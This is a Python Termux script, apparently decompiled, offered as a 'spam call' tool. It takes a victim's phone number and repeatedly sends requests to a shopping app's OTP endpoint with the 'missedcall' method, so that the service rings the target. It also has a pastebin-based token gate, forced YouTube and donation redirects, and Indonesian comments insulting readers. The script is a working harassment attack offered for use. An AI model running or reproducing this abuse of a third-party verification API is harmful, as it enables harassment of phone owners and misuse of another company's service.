#!/data/data/com.termux/files/usr/bin/python

""" Reversed by Exotic Hridoy """

# MAU APA LIAT² NJINKK
# MAU RECODE YA BANGSATT
# MASTAH KO RECODE NJING NGAKAK
# GAK PUNYA MALU YA KONTOL
# SKILL BACOT BUANG AJA KE TONG SAMPAH
# BACOT DI GEDEIN SKILL KEK TAI
# MIKIR GOBLOK BERUSAHA SENDIRI
# JAN CUMAN LIAT SCRIPT ORANG
# TERUS LU TIRU KAN GOBLOK NYA AMPE KE UBUN²
# BERUSAHA SENDIRI ANJINK REAL HASIL SENDIRI
# BUKAN HASIL LIAT² SC ORANG BANGSATT

# Creator : Sanz
# Youtube : FREE TUTORIAL
# Github  : https://github.com/Sxp-ID

# <!-- APA LU LIAT²? LU ANJINK BANGET BANGSAT --!>

file_a = "Data/.__sanz__"
file_b = ""

def hapus_file(pail):
	file = f"{pail}"
	if __import__("os").path.isfile(pail):
		__import__("os").remove(file)
	else:
		pass

def hapus():
	try:
		hapus_file(file_a)
	except:
		pass

try:
	import sys, os, json, requests, random, re, base64, string, time
	from bs4 import BeautifulSoup as sanz_id
	from fake_useragent import UserAgent
	from requests import post
	from requests import get
	from time import sleep
	import subprocess as sp
	from rich.panel import Panel
	from rich.columns import Columns
	from rich.console import Console
	from rich import print as printer
except ModuleNotFoundError:
	hapus()
	exit(
		"\n\033[1;37m[\033[1;31m!\033[1;37m] Module Belum Terinstall, Ketik Perintah Dibawah\n\033[1;37m[\033[1;31m$\033[1;37m] \033[1;33mpip install -r requirements.txt\n"
)
clear = lambda : os.system("cls" if os.name == "nt" else "clear")
subrek_yt_free_tutorial = "https://www.youtube.com/channel/UCLRXFyMN0L8yH9F-xxOd7Og"
user_agent = UserAgent()
agent = user_agent.random
nama_file = "Run.py"
file = ".__sanz_login_token_script_call_id__.json"
path = "/data/data/com.termux/files/usr/.sanz"
try:
	os.mkdir(path)
except:
	pass
try:
	sys.stdout.write('\x1b]2;Script Spam Call by Sanz - Yt : FREE TUTORIAL\x07')
except:
	pass

clear = lambda : os.system("cls" if os.name == "nt" else "clear")
m = "\x1b[0;31m"
h = "\x1b[0;32m"
h3 = "\x1b[3;32m"
k = "\x1b[0;33m"
b = "\x1b[1;34m"
u = "\x1b[0;35m"
p = "\x1b[0;37m"
hx = "\x1b[1;30m"
bx = "\x1b[0;36m"
hx2 = "\x1b[0;30m"
hx3 = "\x1b[30m"
px = "\x1b[0m"
kx = "\x1b[0;33m"
hx4 = "\x1b[0;32m"
hg = "\x1b[4;32m"
mb = "\x1b[41m"
pb = "\x1b[7m"
dlt = "\x1b[K"
x = random.choice([u,bx,h])
km = f"\n    {b}└{p}[{m}!{p}]"
try:
	dt = get("http://ip-api.com/json/").json()
	try:
		sanz_ip = dt["query"]
		sanz_negara = dt["country"]
		sanz_code = dt["countryCode"].lower()
	except KeyError:
		sanz_ip = " "
		sanz_negara = " "

except KeyboardInterrupt:
	hapus();sleep(0.5)
	exit(f"{km} {p}Program dihentikan\n")
except requests.exceptions.ConnectionError:
	hapus();sleep(0.5)
	exit(f"{km} {p}Koneksi internet error\n")
except Exception as lol:
	to=f"{km} {p}Error : {m}"
	hapus();sleep(0.5)
	exit(f"{to}{lol}\n")

clear()
try:
	uax = {
		"user-agent": agent
	}
	url_user = [
		"https://sfile.mobi/b69W7YM2uk7",
		"https://sfile.mobi/2DFRsBv2qwC",
		"https://sfile.mobi/8eRUysg7cca"
	]
	user_a = get(url_user[0],headers=uax).text
	user_b = get(url_user[1],headers=uax).text
	user_c = get(url_user[2],headers=uax).text
	user_1 = sanz_id(user_a,"html.parser").find_all("div",{"class":"list"})[3].text.replace("\n","").replace("- Downloads: ","").replace(" ","").replace(",","")
	user_2 = sanz_id(user_b,"html.parser").find_all("div",{"class":"list"})[3].text.replace("\n","").replace("- Downloads: ","").replace(" ","").replace(",","")
	user_3 = sanz_id(user_c,"html.parser").find_all("div",{"class":"list"})[3].text.replace("\n","").replace("- Downloads: ","").replace(" ","").replace(",","")
	sanz_user = int(user_1) + int(user_2) + int(user_3)
	sanz_user = f"{sanz_user:,}"

except KeyboardInterrupt:
	hapus();sleep(0.5)
	exit(f"{km} {p}Program dihentikan\n")
except requests.exceptions.ConnectionError:
	hapus();sleep(0.5)
	exit(f"{km} {p}Koneksi internet error\n")
except Exception as lol:
	to=f"{km} {p}Error : {m}"
	hapus();sleep(0.5)
	exit(f"{to}{lol}\n")

try:
	if sanz_negara == "Indonesia":
		sanz_negara = f"{m}Indo{p}nesia"
	else:
		try:
			sanz_negara = dt["country"]
		except:
			sanz_negara = " "

except KeyboardInterrupt:
	hapus();sleep(0.5)
	exit(f"{km} {p}Program dihentikan\n")
except Exception as lol:
	to=f"{km} {p}Error : {m}"
	hapus();sleep(0.5)
	exit(f"{to}{lol}\n")

banner = f"{b}┌                                              ┐\n{m}  ┏┓ ┏┓ ┓  ┓   ┳ ┳┓ {hx}| {k}• {p}BY : {k}Sanz\n{m}  ┃  ┣┫ ┃  ┃   ┃ ┃┃ {hx}| {k}• {p}YT : {k}FREE TUTORIAL\n{p}  ┗┛ ┛┗ ┗┛ ┗┛  ┻ ┻┛ {hx}| {k}• {p}GH : {hg}github.com/Sxp-ID{px}\n{hx}  ----------------- {p}+ {hx}------------------------\n{b}└                                              ┘\n{b}    ┌{p}[{k}*{p}] Ip kamu  : {k}{sanz_ip} {hx}| {sanz_negara}\n{b}    └{p}[{k}*{p}] Pengguna : {h}{sanz_user} {p}Orang\n"
menu = f"{b}    ┌{p}[{h}1{p}] Gaskeun spam call\n{b}    ├{p}[{h}2{p}] Support admin\n{b}    └{p}[{h}3{p}] Keluar\n"

class subrek:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")

		self.sanz = subrek_yt_free_tutorial
		self.main()

	def main(self):
		try:
			clear();sleep(0.5)
			menu2 = f"    {b}┌{p}[{h}1{p}] Support dg donasi\n    {b}├{p}[{h}2{p}] Support dg subrek yt\n    {b}├{p}[{h}3{p}] Kembali ke menu awal\n    {b}└{p}[{h}4{p}] Keluar\n"
			print(banner)
			print(menu2)
			sxp = input(f"{b}    ┌{p}[{m}?{p}] Pilih : {h}");sleep(2)
			if sxp in [""]:
				hapus();sleep(0.5)
				exit(f"{km} {p}Jangan kosong ngab{m}..\n")
			elif sxp in ["1","01"]:
				self.sawer()
			elif sxp in ["2","02"]:
				self.sub_yete()
			elif sxp in ["4","04"]:
				hapus();sleep(0.5)
				exit(f"{km} {p}Makasih ngab, jgn lupa balik lagi{m}..\n")
			elif sxp in ["3","03"]:
				Sanz()
			else:
				hapus();sleep(0.5)
				exit(f"{km} {p}Pilihan {hx}'{h}{sxp}{hx}' {p}gk ada ngab{m}..\n")

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program dihentikan\n")
		except Exception as lol:
			to=f"{km} {p}Error : {m}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def sawer(self):
		try:
			sleep(1);print();sleep(1)
			print(f"    {b}┌{p}[{m}!{p}] {p}Makasih buat yg mau berbagi :D");sleep(1)
			print(f"    {b}├{p}[{k}*{p}] {p}Tidak memaksa ya cuman buat yg mau aja ^_^");sleep(2)
			os.system("xdg-open https://saweria.co/SanzXp");sleep(3)
			input(f"    {b}└{p}[{m}>{p}] {p}Klik enter untuk kembali ");sleep(2)
			subrek()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program dihentikan\n")
		except Exception as lol:
			to=f"{km} {p}Error : {m}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def sub_yete(self):
		try:
			sleep(1);print();sleep(1)
			print(f"    {b}┌{p}[{m}!{p}] {p}Subscribe youtube admin woke");sleep(2)
			os.system(f"xdg-open {self.sanz}");sleep(3)
			print(f"    {b}├{p}[{k}*{p}] {p}Terimakasih buat yg udah subrek ^_^");sleep(3)
			input(f"    {b}└{p}[{m}>{p}] {p}Klik enter untuk kembali ");sleep(2)
			subrek()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program dihentikan\n")
		except Exception as lol:
			to=f"{km} {p}Error : {m}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class animasi:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")
		pass

	def wait(self,start_minute,start_second,col):
		import time
		try:
			total_second = start_minute * 60 + start_second
			while total_second:
				mnt, dtk = divmod(total_second, 60)
				sys.stdout.write(f"\r    {b}└{p}[{col}•{p}] Tunggu  : {k}{mnt:02d}:{dtk:02d} {p}detik ")
				time.sleep(1)
				total_second -= 1

			sys.stdout.write(f"\r    {b}└{p}[{col}•{p}] Tunggu  : {k}00:00 {p}detik ");sleep(1)
			print()

		except KeyboardInterrupt:
			sleep(1);hapus()
			exit(f"\r{km} {p}Program dihentikan\n")
		except Exception as lol:
			to=f"\r{km} Error {p}: {m}"
			sleep(1);hapus()
			exit(f"{to}{lol}\n")

class Sanz:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")

		self.Main()

	def Main(self):
		try:
			clear();sleep(0.5)
			print(banner)
			print(menu)
			sxp = input(f"{b}    ┌{p}[{m}?{p}] Pilih : {h}");sleep(2)
			if sxp in [""]:
				hapus();sleep(0.5)
				exit(f"{km} {p}Jangan kosong ngab{m}..\n")
			elif sxp in ["1","01"]:
				__sanz_spam_call__()
			elif sxp in ["2","02"]:
				subrek()
			elif sxp in ["3","03"]:
				hapus();sleep(0.5)
				exit(f"{km} {p}Makasih ngab, jgn lupa balik lagi..\n")
			else:
				hapus();sleep(0.5)
				exit(f"{km} {p}Pilihan {hx}'{p}{sxp}{hx}' {p}gk ada ngab..\n")

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program dihentikan\n")
		except Exception as lol:
			to=f"{km} {p}Error : {m}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class __sanz_spam_call__:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")

		self.Main()

	def Main(self):
		try:
			clear();sleep(0.5)
			print(banner)
			no = input(f"    {b}┌{p}[{m}?{p}] Nomor target {m}({bx}8xx{m})  {p}: {bx}");sleep(2)
			if no == "":
				hapus();sleep(0.5)
				exit(f"{km} {p}Jangan kosong ngab{m}..\n")
			elif len(no) <= 9:
				hapus();sleep(0.5)
				exit(f"{km} {p}Nomor tidak valid{m}..\n")

			jml = input(f"    {b}└{p}[{m}?{p}] Jumlah spam {m}({p}max{hx}:{bx}3{m}) {p}: {bx}");sleep(2)
			if jml == "":
				hapus();sleep(0.5)
				exit(f"{km} {p}Jangan kosong ngab{m}..\n")
			elif int(jml) > 3:
				hapus();sleep(0.5)
				exit(f"{km} {p}Jumlah terlalu besar ngab{m}..\n")
			else:
				print();sleep(1)
				for sxp in range(int(jml)):
					sanz = post("https://api.dagangan.com/v2/users/sms", headers = {"Host": "api.dagangan.com", "accept": "application/json", "content-type": "application/json", "content-length": "50", "accept-encoding": "gzip", "user-agent": agent, "x-newrelic-id": "Vg8AVlRVDhAIUVFVAAEGX10="}, json = {"phone": f"0{no}", "otp_method": "missedcall"})
					sanz = json.loads(sanz.text)
					if sanz["status"] == "success":
						print(f"    {b}┌{p}[{h}•{p}] Status  : {h}{sanz['status']}");sleep(1)
						print(f"    {b}├{p}[{h}•{p}] Message : {h}{sanz['message']}");sleep(1)
						animasi().wait(0,80,h)
						sleep(1);print();sleep(1)
					else:
						print(f"    {b}┌{p}[{m}•{p}] Status  : {m}{sanz['status']}");sleep(1)
						print(f"    {b}├{p}[{m}•{p}] Message : {m}{sanz['message']}");sleep(1)
						animasi().wait(0,80,m)
						sleep(1);print();sleep(1)

				print(f"    {b}┌{p}[{k}*{p}] Done Ngab..");sleep(1)
				print(f"    {b}└{p}[{m}!{p}] Jangan Lupa Subrek Yt {h}FREE TUTORIAL");sleep(1)
				sleep(1);print();sleep(1);hapus();exit()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi internet error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n    {b}┌{p}[{m}!{p}] Server error\n    {b}└{p}[{m}>{p}] Silahkan coba lagi nanti{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n    {b}┌{p}[{m}!{p}] Server error\n    {b}└{p}[{m}>{p}] Silahkan coba lagi nanti{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error : {m}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class __sanz_login__:
	def __init__(self):
		self.__aink_sanz__ = "FREE TUTORIAL"
		self.login()

	def animasi(self,delay):
		m = "\x1b[1;31m"
		h = "\x1b[1;32m"
		k = "\x1b[1;33m"
		p = "\x1b[1;37m"
		try:
			sxp = ['█■■■■', '■█■■■', '■■█■■', '■■■█■', '■■■■█']
			for _ in range(int(delay)):
				for i in range(len(sxp)):
					sleep(0.25)
					sys.stdout.write(f"\r{p}[{h}•{p}] Memverifikasi token, tunggu {k}[{h}"+sxp[i % len(sxp)]+f"{k}] ")
					sys.stdout.flush()

			sys.stdout.write("\r\033[K");sleep(1)

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			sys.stdout.write("\r\033[K")
			exit(f"{p}[{m}!{p}] Program dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			sys.stdout.write("\r\033[K")
			exit(f"{p}[{m}!{p}] Koneksi internet error\n")
		except Exception as lol:
			hapus();sleep(0.5)
			sys.stdout.write("\r\033[K")
			to=f"{p}[{m}!{p}] Error {m}: {p}"
			exit(f"{to}{lol}\n")

	def sxp_waktu(self):
		import time
		_time_ = int(time.strftime("%H"))
		if _time_ < 12:
			return "Pagi"
		elif _time_ < 15:
			return "Siang"
		elif _time_ < 18:
			return "Sore"
		else:
			return "Malam"

	def log_pewe(self):
		from datetime import datetime as w
		import time, random
		# -- variabel tgl dll -- #
		_waktu = time.strftime("%H:%M:%S %Z")
		waktu = time.localtime()
		tanggal = time.strftime("%d",waktu)
		_bulan = time.strftime("%B",waktu)
		tahun = time.strftime("%Y",waktu)
		_hari = time.strftime("%A",waktu)
		bulan_ = {"January": "Januari", "February": "Februari", "March": "Maret", "April": "April", "May": "Mei", "June": "Juni", "July": "Juli", "August": "Agustus", "September": "September", "October": "Oktober", "November": "November", "December": "Desember"}
		hari_ = {"Sunday": "Minggu", "Monday": "Senin", "Tuesday": "Selasa", "Wednesday": "Rabu", "Thursday": "Kamis", "Friday": "Jumat", "Saturday": "Sabtu"}
		bulan = bulan_.get(_bulan)
		hari = hari_.get(_hari)
		rd = random.choice([10,15,20])
		m = "\x1b[1;31m"
		h = "\x1b[1;32m"
		k = "\x1b[1;33m"
		p = "\x1b[1;37m"
		hx = "\x1b[1;30m"
		hx2 = "\x1b[0;30m"
		bx = "\x1b[1;36m"
		px = "\x1b[0m"
		hg = "\033[4;32m"
		mm = "\033[41m"
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			url = "https://pastebin.com/raw/yzQPb7pU" # url link + pass random mode
			req = get(url,headers={"user-agent":agent}).text
			index_link = req.split("Link: ")[1].split("\r\n")[0].split("|")
			index_pass = req.split("Pass: ")[1].split("\r\n")[0].split("|")
			_link1 = index_link[0];_link2 = index_link[1];_link3 = index_link[2]
			_pass1 = index_pass[0];_pass2 = index_pass[1];_pass3 = index_pass[2]
			_acak1 = f"{_link1}|{_pass1}";_acak2 = f"{_link2}|{_pass2}";_acak3 = f"{_link3}|{_pass3}"
			index1 = random.choice([_acak1.split("|"),_acak2.split("|"),_acak3.split("|")]);index2 = index1[0].split(";")
			_link_a = get("https://tinyurl.com/api-create.php?url="+index2[0],headers={"user-agent":agent}).text
			_link_b = get("https://tinyurl.com/api-create.php?url="+index2[1],headers={"user-agent":agent}).text
			_pass = get(index1[1],headers={"user-agent":agent}).text
			# -- Sanz Ganz -- #
			banner = "[bold red]● [bold yellow]● [bold green]●[/]\n[bold red]     __             _        ___\n    / /  ___  ___ _(_)__    / _ \___ ____ ____\n   / /__/ _ \/ _ `/ / _ \  / ___/ _ `/ _ `/ -_)\n[bold white]  /____/\___/\_, /_/_//_/ /_/   \_,_/\_, /\__/\n            /___/                   /___/[/]\n\n   [bold white on red] Created by Sanz - Youtube : FREE TUTORIAL [/]"
			printer(Panel(banner,title=f"[bold red]• [bold white]Selamat {self.sxp_waktu()} [bold red]•[/]",width=53,style="color(8)"));print()
			print(f"{p}[{m}¤{p}] Tanggal {m}: {p}{hari}, {tanggal} {bulan} {tahun}")
			print(f"{p}[{m}¤{p}] Waktu   {m}: {p}{_waktu}")
			print(f"{hx2}-------------")
			print(f"{p}[{m}•{p}] Link token {m}: {hg}{_link_a}{px}");print()
			print(f"{p}[{m}!{p}] Jika link diatas error atau tidak bisa dilewati,\n    silahkan gunakan link dibawah {m}↓");print()
			print(f"{p}[{m}•{p}] Link token {m}: {hg}{_link_b}{px}");print()
			print(f"{p}[{m}!{p}] Silahkan ambil dulu {m}↑{p} token nya lalu")
			print(f"    pastekan dibagian input dibawah {m}↓");print()
			sanz_pw = input(f"{p}[{m}?{p}] Input token {m}: {hx2}")
			sleep(2);print();sleep(1)
			if sanz_pw == _pass:
				self.animasi(int(rd))
				sleep(0.5)
				save = open(f"{path}/{file}","w").write('{\n  "data": {\n  "token": "'+sanz_pw+'",\n  "creator": "Sanz",\n  "youtube": "FREE TUTORIAL"\n }\n}')
				print(f"\a{p}[{h}✓{p}] Token benar")
				sleep(2)
				clear()
			elif sanz_pw == "":
				sleep(0.5)
				print(f"\a{p}[{m}!{p}] Jangan kosong ngab")
				sleep(2)
				self.log_pewe()
			else:
				self.animasi(int(rd))
				sleep(0.5)
				print(f"\a{p}[{m}x{p}] Token salah")
				sleep(2)
				self.log_pewe()

	def login(self):
		m = "\x1b[1;31m"
		h = "\x1b[1;32m"
		p = "\x1b[1;37m"
		bx = "\x1b[1;36m"
		try:
			self.log_pewe()
			clear()
			print(f"{bx}Subrek dulu channel {p}YT Aing cuk{bx}!!");sleep(1)
			os.system(f"xdg-open {subrek_yt_free_tutorial}");sleep(10)
			Sanz()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Program dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Koneksi internet error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Server error\n{p}[{m}>{p}] Silahkan coba lagi nanti{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Server error\n{p}[{m}!{p}] Silahkan coba lagi nanti{m}..\n")
		except Exception as lol:
			hapus();sleep(0.5)
			to=f"\n{p}[{m}!{p}] Error {m}: {p}"
			exit(f"{to}{lol}\n")

if __name__ == "__main__":
	try:
		___free_tutorial___ = "Script termux spam call terbaru by Sanz"
		_____sanz_ganz_____ = open("Sanz","w").write(___free_tutorial___)
		__sanz_login__()
		#Sanz()
	except KeyboardInterrupt:
		hapus();sleep(0.5)
		exit(f"{km} {p}Program dihentikan\n")
	except requests.exceptions.ConnectionError:
		hapus();sleep(0.5)
		exit(f"{km} {p}Koneksi internet error\n")
	except KeyError:
		hapus();sleep(0.5)
		exit(f"\n    {b}┌{p}[{m}!{p}] Server error\n    {b}└{p}[{m}>{p}] Silahkan coba lagi nanti{m}..\n")
	except json.decoder.JSONDecodeError:
		hapus();sleep(0.5)
		exit(f"\n    {b}┌{p}[{m}!{p}] Server error\n    {b}└{p}[{m}>{p}] Silahkan coba lagi nanti{m}..\n")
	except Exception as lol:
		to=f"{km} {p}Error : {m}"
		hapus();sleep(0.5)
		exit(f"{to}{lol}\n")
